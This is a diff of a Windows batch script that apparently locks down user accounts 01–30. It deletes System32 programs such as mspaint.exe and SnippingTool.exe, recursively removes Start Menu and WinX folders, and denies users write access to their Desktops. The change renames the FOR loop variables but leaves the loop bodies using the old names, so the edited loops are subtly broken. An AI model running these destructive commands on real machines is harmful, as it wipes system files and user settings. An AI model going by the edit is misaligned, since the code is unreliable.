@@ -22,7 +22,7 @@ del C:\Windows\System32\mspaint.exe
 del C:\Windows\System32\SnippingTool.exe
 cd C:\ProgramData\Microsoft\Windows\Start Menu
 rd /s /q Programs
-FOR %%a in (01,02,03,04,05,06,07,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30) DO (
+FOR %%b in (01,02,03,04,05,06,07,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30) DO (
 cd C:\Users\%%a\AppData\Local\Microsoft\Windows
 rd /s /q WinX
 cd C:\Users\%%a\AppData\Roaming\Microsoft\Windows\Start Menu
@@ -33,7 +33,7 @@ set /a A1+=1
 goto top
 
 :2
-FOR %%b in (01,02,03,04,05,06,07,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30) DO (
+FOR %%c in (01,02,03,04,05,06,07,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30) DO (
 ICACLS C:\Users\%%b\Desktop /deny %%b:W
 )
 pause
